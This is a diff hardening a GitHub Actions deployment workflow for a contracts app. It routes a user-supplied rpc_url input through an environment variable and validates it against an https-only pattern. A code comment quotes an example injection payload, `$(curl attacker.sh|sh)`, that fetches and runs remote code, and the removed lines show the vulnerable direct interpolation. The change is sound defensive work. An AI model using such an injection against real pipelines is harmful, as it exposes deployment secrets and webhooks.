@@ -81,11 +81,21 @@ jobs:
           ENTITY_NFT_BEACON: ${{ vars.ENTITY_NFT_BEACON }}
           ENTITY_EDITION_BEACON: ${{ vars.ENTITY_EDITION_BEACON }}
           EPISODE_NFT_BEACON: ${{ vars.EPISODE_NFT_BEACON }}
+          # Hardened: pass workflow_dispatch input through an env var rather
+          # than interpolating it directly into shell. Without this, an
+          # operator with workflow-dispatch permission could supply
+          # `$(curl attacker.sh|sh)` as `rpc_url` and exfiltrate every
+          # secret exposed to this job (TIMELOCK_ADDRESS, SAFE_ADDRESS,
+          # OPS_SLACK_WEBHOOK_URL).
+          RPC_URL_INPUT: ${{ inputs.rpc_url }}
+          BASE_RPC_URL_SECRET: ${{ secrets.BASE_RPC_URL }}
         working-directory: apps/contracts
         run: |
-          RPC_URL="${{ inputs.rpc_url || secrets.BASE_RPC_URL }}"
-          if [ -z "$RPC_URL" ]; then
-            echo "::error::BASE_RPC_URL secret is not set and no override provided."
+          RPC_URL="${RPC_URL_INPUT:-$BASE_RPC_URL_SECRET}"
+          # Whitelist: must parse as an https URL. Rejects shell-metachar
+          # payloads, non-https schemes, and empty values.
+          if ! printf '%s' "$RPC_URL" | grep -Eq '^https://[A-Za-z0-9.-]+(:[0-9]+)?(/[A-Za-z0-9._~:/?#@!$&+,;=%-]*)?$'; then
+            echo "::error::RPC_URL is empty or not a valid https URL."
             exit 1
           fi
           if [ -z "$TIMELOCK_ADDRESS" ]; then
